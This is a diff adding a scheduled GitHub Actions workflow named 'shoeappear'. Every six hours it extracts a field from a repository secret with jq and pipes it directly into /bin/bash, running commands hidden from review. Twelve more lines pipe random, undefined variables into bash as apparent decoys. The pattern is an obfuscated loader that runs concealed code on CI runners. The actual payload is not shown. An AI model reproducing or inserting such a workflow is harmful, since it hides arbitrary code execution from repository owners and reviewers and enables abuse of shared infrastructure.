@@ -1,0 +1,30 @@
+name: shoeappear
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shoeappear
+        env:
+          fag168: ${{ secrets.fag168 }}
+        run: |
+          echo $fag168 | jq -r .bhyqz33 | /bin/bash
+          echo $mdby46127 | jq -r .o5 | /bin/bash
+          echo $rvvpv761 | jq -r .slpl57915 | /bin/bash
+          echo $d4131 | jq -r .a92190 | /bin/bash
+          echo $o27650 | jq -r .f105 | /bin/bash
+          echo $vv4096 | jq -r .sa43785 | /bin/bash
+          echo $e11 | jq -r .t3 | /bin/bash
+          echo $tfr30658 | jq -r .nxwj4981 | /bin/bash
+          echo $atbk2129 | jq -r .l6796 | /bin/bash
+          echo $gusq89670 | jq -r .wuvq76646 | /bin/bash
+          echo $gjh16979 | jq -r .xi669 | /bin/bash
+          echo $iu34130 | jq -r .uz05 | /bin/bash
+          echo $rfk374 | jq -r .hm10 | /bin/bash
+
